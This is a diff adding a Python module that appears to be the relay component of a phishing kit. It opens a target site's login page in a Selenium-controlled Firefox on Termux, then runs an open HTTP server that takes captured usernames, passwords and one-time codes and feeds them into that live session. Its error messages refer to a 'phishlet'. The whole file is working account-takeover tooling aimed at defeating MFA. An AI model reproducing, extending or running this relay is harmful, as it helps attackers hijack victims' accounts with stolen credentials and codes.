@@ -1,0 +1,254 @@
+# server.py
+# HTTP server for receiving credentials and OTP, plus browser lifecycle management.
+
+import http.server
+import socketserver
+import threading
+import traceback
+import time
+import os
+import urllib.request
+import urllib.error
+from urllib.parse import urlparse, parse_qs
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.firefox.service import Service
+from selenium.common.exceptions import WebDriverException, TimeoutException
+
+from mfa_handler import mfa_handler
+from login_handler import attempt_login
+from utils import LOGIN_PATH
+
+DEFAULT_PORT     = 8080
+GECKODRIVER_PATH = '/data/data/com.termux/files/usr/bin/geckodriver'
+FIREFOX_PATH     = '/data/data/com.termux/files/usr/bin/firefox'
+
+
+# ---------------------------------------------------------------------------
+# Browser setup
+# ---------------------------------------------------------------------------
+
+def _configure_display(headless: bool) -> None:
+    """Ensure DISPLAY is set for non-headless mode on Termux."""
+    if not headless and 'DISPLAY' not in os.environ:
+        os.environ['DISPLAY'] = ':0'
+
+
+def _build_driver(headless: bool) -> webdriver.Firefox:
+    """
+    Construct and return a Firefox WebDriver instance.
+
+    Args:
+        headless: If True, run Firefox without a GUI.
+    """
+    _configure_display(headless)
+    options = Options()
+    options.binary_location = FIREFOX_PATH
+    if headless:
+        options.add_argument("--headless")
+    return webdriver.Firefox(service=Service(GECKODRIVER_PATH), options=options)
+
+
+def _quit_driver(driver) -> None:
+    """Cleanly shut down the WebDriver, suppressing any errors."""
+    try:
+        driver.quit()
+    except Exception:
+        pass
+
+
+def _verify_login_path(default_domain: str) -> dict:
+    """
+    Verify the login page is reachable before handing it to the browser.
+    HTTP errors (403, 404 etc) are acceptable — they mean the server responded.
+    Connection errors or DNS failures indicate a bad LOGIN_PATH or domain.
+
+    Returns:
+        dict with keys: success (bool), error (str | None)
+    """
+    url = f"{default_domain}{LOGIN_PATH}"
+    try:
+        urllib.request.urlopen(url, timeout=5)
+        return {"success": True, "error": None}
+    except urllib.error.HTTPError:
+        # Server responded with an error code — path exists, proceed
+        return {"success": True, "error": None}
+    except urllib.error.URLError as e:
+        return {"success": False, "error": f"Login page not reachable — check LOGIN_PATH in phishlet (currently '{LOGIN_PATH}'): {e.reason}"}
+    except Exception as e:
+        return {"success": False, "error": f"Login page not reachable — check LOGIN_PATH in phishlet (currently '{LOGIN_PATH}'): {e}"}
+
+
+# ---------------------------------------------------------------------------
+# HTTP response helpers
+# ---------------------------------------------------------------------------
+
+def _send_html(handler, status: int, body: bytes) -> None:
+    """Write a minimal HTML response."""
+    handler.send_response(status)
+    handler.send_header('Content-type', 'text/html')
+    handler.end_headers()
+    handler.wfile.write(body)
+
+
+# ---------------------------------------------------------------------------
+# Route handlers
+# ---------------------------------------------------------------------------
+
+def _handle_start_login(handler, params: dict, driver, default_domain: str, port: int) -> None:
+    """Process a /start-login request: validate params, run login, respond."""
+    username = params.get('username', [''])[0]
+    password = params.get('password', [''])[0]
+    site     = params.get('site', [default_domain])[0] or default_domain
+
+    if not username or not password:
+        _send_html(handler, 400, b'<html><body><h1>Error</h1><p>Missing username or password</p></body></html>')
+        return
+
+    mfa_handler.otp_callback = mfa_handler.set_otp_callback()
+    login_result = attempt_login(driver, username, password, site, port)
+    time.sleep(1)
+    _send_html(
+        handler, 200,
+        f'<html><body><h1>Login Attempt Complete!</h1><p>Result: {login_result["outcome"]}</p></body></html>'.encode()
+    )
+
+
+def _handle_submit_otp(handler, params: dict) -> None:
+    """Process a /submit-otp request: validate OTP, fire callback, respond."""
+    otp = params.get('otp', [''])[0]
+
+    if not otp:
+        handler.send_response(400)
+        handler.end_headers()
+        return
+
+    if not mfa_handler.otp_callback:
+        _send_html(handler, 400, b'<html><body><h1>Error</h1><p>No active MFA session</p></body></html>')
+        return
+
+    mfa_handler.otp_callback(otp)
+    _send_html(handler, 200, b'<html><body><h1>OTP Received!</h1><p>Check your browser...</p></body></html>')
+
+
+def _handle_index(handler, port: int) -> None:
+    """Serve the status/usage page."""
+    _send_html(handler, 200, f'''
+        <html><body>
+            <h2>Login Automation Server</h2>
+            <p><strong>Start Login:</strong><br>
+            <code>curl "http://localhost:{port}/start-login?username=USER&password=PASS&site=https://example.com"</code></p>
+            <p><strong>Submit OTP:</strong><br>
+            <code>curl "http://localhost:{port}/submit-otp?otp=123456"</code></p>
+            <p>Server is running and waiting for commands...</p>
+        </body></html>
+    '''.encode())
+
+
+# ---------------------------------------------------------------------------
+# Server
+# ---------------------------------------------------------------------------
+
+def _build_handler_class(driver, default_domain: str, port: int):
+    """
+    Dynamically construct a BaseHTTPRequestHandler subclass with driver
+    and domain bound via closure, avoiding mutable class-level state.
+    """
+    class Handler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            parsed = urlparse(self.path)
+            params = parse_qs(parsed.query)
+
+            if parsed.path == '/start-login':
+                _handle_start_login(self, params, driver, default_domain, port)
+            elif parsed.path == '/submit-otp':
+                _handle_submit_otp(self, params)
+            else:
+                _handle_index(self, port)
+
+        def log_message(self, format, *args):
+            pass  # Suppress default access logging
+
+    return Handler
+
+
+def start_login_server(driver, default_domain: str, port: int = DEFAULT_PORT):
+    """
+    Start the HTTP server in a daemon thread.
+
+    Args:
+        driver:         Selenium WebDriver instance
+        default_domain: Fallback domain if none provided in request
+        port:           Port to listen on
+
+    Returns:
+        Running socketserver.TCPServer instance
+    """
+    socketserver.TCPServer.allow_reuse_address = True
+    server = socketserver.TCPServer(("", port), _build_handler_class(driver, default_domain, port))
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    return server
+
+
+# ---------------------------------------------------------------------------
+# Orchestrator
+# ---------------------------------------------------------------------------
+
+def perform_login(default_domain: str, port: int = DEFAULT_PORT, headless: bool = False) -> None:
+    """
+    Launch Firefox, navigate to the login page, start the HTTP server,
+    and block until interrupted.
+
+    Args:
+        default_domain: Normalized site URL
+        port:           Port for the local automation server
+        headless:       If True, run Firefox without a GUI
+    """
+    driver = _build_driver(headless)
+    server = None
+
+    try:
+        # Pre-flight check: verify login path is reachable before handing to browser
+        preflight = _verify_login_path(default_domain)
+        if not preflight["success"]:
+            print(f"❌ PHISHLET ERROR: {preflight['error']}")
+            _quit_driver(driver)
+            return
+
+        try:
+            driver.get(f"{default_domain}{LOGIN_PATH}")
+        except TimeoutException:
+            # Timeout during navigation — not a fatal error, let the server
+            # start and allow login_handler to report the real issue.
+            pass
+        except WebDriverException as e:
+            msg = e.msg.splitlines()[0] if e.msg else str(e)
+            if "neterror" in msg or "dnsNotFound" in msg or "unreachable" in msg.lower():
+                print(f"❌ FATAL: Browser failed to load login page: {msg}")
+                _quit_driver(driver)
+                return
+            # Any other WebDriverException — let it surface naturally
+            raise
+
+        server = start_login_server(driver, default_domain, port)
+        print(f"✅ Server running at http://localhost:{port} — press Ctrl+C to exit")
+        print("✅ Firefox is ready! Waiting for login requests...")
+        print(f"   Start login: curl 'http://localhost:{port}/start-login?username=USER&password=PASS&site={default_domain}'")
+        print(f"   Submit OTP:  curl 'http://localhost:{port}/submit-otp?otp=XXXXXX'")
+
+        while True:
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("\n👋 Closing browser...")
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+    finally:
+        _quit_driver(driver)
+        if server:
+            try:
+                server.shutdown()
+            except Exception:
+                pass
